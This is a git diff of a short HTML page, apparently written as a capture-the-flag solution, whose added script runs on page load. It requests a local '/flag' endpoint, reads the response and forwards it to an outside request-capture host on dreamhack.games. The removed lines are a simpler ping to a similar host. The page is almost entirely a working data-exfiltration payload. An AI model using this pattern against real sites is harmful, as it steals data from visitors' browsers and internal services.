@@ -3,14 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flag Finder</title>
+    <title>Flag Sender</title>
 </head>
 <body>
-    <h1>Flag Finder3</h1>
+    <h1>Flag Sender22222</h1>
     <script>
-        // 최종 FLAG로 요청 보내기 (응답 기다리지 않음)
-        const finalRequestUrl = `https://ulmpaot.request.dreamhack.games?flag=good`;
-        fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+        const baseFlag = 'hspace'; // 고정된 FLAG 부분
+
+        const sendFlag = async () => {
+            const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(baseFlag)}`;
+
+            const response = await fetch(requestUrl);
+            const text = await response.text();
+
+            console.log(`Requesting: ${requestUrl}`); // 요청 로그
+            console.log(`Response: ${text}`); // 응답 로그
+
+            // 최종 요청 보내기 (응답 text를 파라미터로 사용)
+            const finalRequestUrl = `https://lyszjex.request.dreamhack.games?flag=${encodeURIComponent(text)}`;
+            fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
+
+            console.log('Final FLAG sent:', text);
+        };
+
+        sendFlag();
     </script>
 </body>
 </html>
